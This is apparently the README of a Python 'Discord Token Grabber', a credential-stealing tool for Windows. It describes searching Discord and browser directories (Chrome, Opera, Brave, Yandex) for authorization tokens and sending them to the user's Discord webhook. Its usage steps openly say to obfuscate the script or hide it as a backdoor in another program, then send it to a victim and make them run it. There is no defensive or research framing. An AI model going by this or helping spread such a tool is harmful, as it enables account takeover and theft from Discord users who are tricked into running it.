<h1 align="center">Discord Token Grabber</h1>
<p align="center">A Discord token grabber written in Python 3.</p>

This version of the grabber only supports **Windows**.

# Features
 - No local caching
 - Transfers via Discord webhook
 - Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
 - No external Python modules required
 - \[**todo**\] Cross-platform support

<br>

# How to use
 1. Create a webhook on your Discord server. I recommend creating a new server.
 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
 3. *(obfuscate the code or install it as a backdoor in an other script.)*
 4. Send the script to your victim and make them run it.

<br>

# Author
- **wodx**
    - [Github](https://github.com/WodXTV)
    - [Twitter](https://twitter.com/wodxgod)
    - [Discord](https://discord.gg/BYjPFTs)
    - [PayPal.me](https://www.paypal.com/paypalme2/wodx)

# Donate
You can donate to my PayPal at https://www.paypal.com/paypalme2/wodx <3
